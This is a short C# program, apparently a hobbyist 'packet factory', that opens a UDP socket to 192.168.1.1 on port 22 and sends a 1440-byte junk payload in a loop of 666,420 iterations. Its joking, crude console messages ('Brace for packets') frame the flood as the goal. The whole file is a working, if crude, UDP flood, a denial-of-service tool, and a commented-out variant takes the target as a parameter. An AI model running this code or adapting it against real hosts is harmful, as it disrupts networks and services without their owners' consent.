using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace packets
{
    // Packet factory! I make the packets.
    public class Alpha
    {
        //public void Beta(IPAddress target, int port)
        public void Beta()
        {
            IPAddress target = IPAddress.Parse("192.168.1.1");
            IPEndPoint remote = new IPEndPoint(target, 22);
            string payload = new String('x', 1440);
            byte[] paybytes = Encoding.ASCII.GetBytes(payload);
            Socket send = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            try { send.Connect(remote); }
	        catch (Exception e)
	        {
		        Console.WriteLine("Exception during socket connection/creation: {0}", e.ToString());
		        throw;
	        }

            Console.WriteLine("\"Connected\" to {0}", send.RemoteEndPoint.ToString());
            Console.WriteLine("Generating payload. Smoke meth and hail stan erryday.");
            Console.WriteLine("Brace for packets.");
            for (int i = 0; i < 666420; i++ )
            {
                try
                {
                    int bsent = send.Send(paybytes);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unable to send packets. Balls. Error: {0}", e.ToString());
                    throw;
                }
            }
            Console.WriteLine("Shutting down the socket");
            Console.WriteLine("Today was a good day.");
            send.Shutdown(SocketShutdown.Both);
            send.Close();
        }
    };

    public class parent
    {
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("Starting thread(s)");
                Alpha oAlpha = new Alpha();
                //Thread aThread = new Thread(new ThreadStart(oAlpha.Beta(targip, 22)));
                Thread aThread = new Thread(new ThreadStart(oAlpha.Beta));
                aThread.Start();
                while (!aThread.IsAlive);
                aThread.Join();


            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception in parent: {0}", e.ToString());
            }
        }
    }
}
